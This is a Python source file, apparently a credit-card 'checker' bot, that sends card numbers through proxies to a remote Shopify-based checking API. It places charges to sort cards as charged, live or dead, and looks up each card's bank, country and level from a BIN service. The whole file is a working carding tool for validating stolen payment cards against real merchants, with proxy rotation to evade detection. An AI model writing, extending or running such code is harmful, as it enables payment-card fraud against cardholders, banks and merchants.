import aiohttp
import asyncio

API_URL = "http://botspark.de1.octavia.id:25667/shopify"  # Ganti dengan API real lo

async def check_proxy(proxy: str) -> bool:
    """Cek proxy dengan test request ke API Shopify"""
    test_url = "http://httpbin.org/ip"  # ganti ke API lo kalo perlu
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(test_url, proxy=proxy) as resp:
                return resp.status == 200
    except:
        return False

async def check_shopify(card: str, proxy: str = None):
    params = {"cc": card, "sites": "auto"}
    if proxy:
        params["proxy"] = proxy
    timeout = aiohttp.ClientTimeout(total=30)
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(API_URL, params=params) as resp:
                if resp.status != 200:
                    return {"status": "ERROR", "raw": f"HTTP {resp.status}"}
                data = await resp.json()
                return parse_response(data)
    except Exception as e:
        return {"status": "ERROR", "raw": str(e)}

def parse_response(data):
    amount = data.get("amount", "0")
    currency = data.get("currency", "USD")
    resp_text = data.get("response", "").upper()
    if "THANK YOU" in resp_text or "ORDER_PLACED" in resp_text:
        status = "CHARGED"
    elif "OTP_REQUIRED" in resp_text or "INSUFFICIENT_FUNDS" in resp_text:
        status = "LIVE"
    else:
        status = "DEAD"
    return {"status": status, "amount": amount, "currency": currency, "raw": data}

async def get_bin_info(cc_first6):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{cc_first6}") as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        "bank": data.get("bank", "Unknown"),
                        "country": data.get("country_name", "Unknown"),
                        "country_flag": data.get("country_flag", ""),
                        "brand": data.get("brand", "Unknown"),
                        "card_type": data.get("type", "Unknown"),
                        "level": data.get("level", data.get("type", "Unknown")),
                        "bank_url": data.get("bank_url", "")
                    }
    except:
        pass
    return {
        "bank": "Unknown",
        "country": "Unknown",
        "country_flag": "",
        "brand": "Unknown",
        "card_type": "Unknown",
        "level": "Unknown",
        "bank_url": ""
    }
